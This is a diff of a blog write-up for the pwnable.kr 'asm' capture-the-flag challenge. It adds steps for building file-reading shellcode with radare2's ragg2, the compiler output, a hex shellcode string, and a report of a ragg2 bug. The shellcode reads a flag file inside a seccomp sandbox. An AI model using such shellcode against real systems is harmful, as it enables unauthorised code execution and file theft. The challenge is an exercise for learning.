@@ -4,7 +4,7 @@ title: r2land - asm challenge
 tags: [ shellcode, radare2 ]
 ---
 
-This challenge is hosted by ``pwnable.kr`` and is about to teach the basics of shellcoding.
+This challenge is hosted at ``pwnable.kr`` and is about to teach the basics of shellcoding.
 We will use ``radare2`` framework for analysis and exploit development.
 
 ## The challenge
@@ -30,6 +30,8 @@ asm@ubuntu:~$ file ./asm
 ./asm: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d7401f94b1d6bf6a5afe4b8a9457e71faa2eb5e9, not stripped
 asm@ubuntu:~$ 
 ```
+
+So it looks like, the code of ``asm`` binary is a first place to look at.
 
 ### The host process code
 
@@ -99,7 +101,7 @@ The code is self descriptive and has following properties:
 
 - is x86 64 bit ELF
 - has seccomp filtering applied which means your shellcode can execute only whitelisted syscalls.
-- there is some stub code which is executed before user-supplied shellcode.
+- there is some ``stub`` code which is executed before user-supplied shellcode.
 
 
 ## The Plan
@@ -157,3 +159,73 @@ You can view disassembly by seeking (s) to that address, changing the block size
 [0x002020c0]> 
 ```
 
+So the purpose of the ``stub`` assembly is to clear the registers. Let's summarize the knowledge:
+ - the process with ``asm`` ELF image is spawned locally via ``nc``
+ - we are able to execute arbitrary code in the abovementioned process under the sandbox tightenings
+ - the file ``this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo00000
+00000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong`` contains a flag and is accessible by ``asm`` process.
+
+## The Shellcode
+
+We will use ``ragg2`` to generate the shellcode. It should be as simple as this:
+
+{% highlight C %}
+const char* file="this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong";
+int main()
+{
+	char buff[4096];
+	int fd = open(file,0,0);
+	int len = read(fd, buff, 4096);
+	write(1,buff,len);
+}
+{% endhighlight %}
+
+
+To generate shellcode in this particular scenario (same arch and bits of host and target), simply execute following command:
+
+```
+$ ragg2 shellcode.c
+```
+
+But unfortunately, it does not compile.
+
+```
+$ ragg2 shellcode.c
+'clang' -fPIC -fPIE -pie -fpic -m64 -fno-stack-protector -nostdinc -include '/usr/include/libr/sflib'/'linux-x86-64'/sflib.h -z execstack -fomit-frame-pointer -finline-functions -fno-zero-initialized-in-bss -o 'shellcode.c.tmp' -S -Os 'shellcode.c'
+clang: warning: -z execstack: 'linker' input unused [-Wunused-command-line-argument]
+clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]
+'clang' -fPIC -fPIE -pie -fpic -m64 -nostdlib -Os -o 'shellcode.c.o' 'shellcode.c.s'
+rabin2 -o 'shellcode.c.text' -O d/S/'.text' 'shellcode.c.o'
+!!! Oops
+fail assembling
+r_egg_assemble: invalid assembly
+$ 
+```
+
+Well. Bad start, isn't it? It occurs that r2 2.9 has some bug. It looks like this particular example does not compile to relocable shellcode if the ``file`` C-string has more than 48 characters.
+Consider following proof:
+
+```
+$ cat shellcode.c 
+
+//const char* file="this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong";
+
+const char* file="shellcode.c";
+int main()
+{
+	char buff[4096];
+	int fd = open(file,0,0);
+	int len = read(fd, buff, 4096);
+	write(1,buff,len);
+}
+$ ragg2 shellcode.c -z
+'clang' -fPIC -fPIE -pie -fpic -m64 -fno-stack-protector -nostdinc -include '/usr/include/libr/sflib'/'linux-x86-64'/sflib.h -z execstack -fomit-frame-pointer -finline-functions -fno-zero-initialized-in-bss -o 'shellcode.c.tmp' -S -Os 'shellcode.c'
+clang: warning: -z execstack: 'linker' input unused [-Wunused-command-line-argument]
+clang: warning: argument unused during compilation: '-pie' [-Wunused-command-line-argument]
+'clang' -fPIC -fPIE -pie -fpic -m64 -nostdlib -Os -o 'shellcode.c.o' 'shellcode.c.s'
+rabin2 -o 'shellcode.c.text' -O d/S/'.text' 'shellcode.c.o'
+"\xeb\x00\x48\x81\xec\x88\x0f\x00\x00\x48\x8d\x05\xe8\x0d\x20\x00\x48\x8b\x38\x31\xf6\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc1\x48\x8d\x74\x24\x80\xba\x00\x10\x00\x00\x31\xc0\x89\xcf\x0f\x05\x48\x89\xc1\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x89\xca\x0f\x05\x31\xc0\x48\x81\xc4\x88\x0f\x00\x00\xc3\x73\x68\x65\x6c\x6c\x63\x6f\x64\x65\x2e\x63\x00"
+$ 
+```
+
+As it seemed to be a bug, I've submitted the issue to radare team: https://github.com/radare/radare2/issues/11104
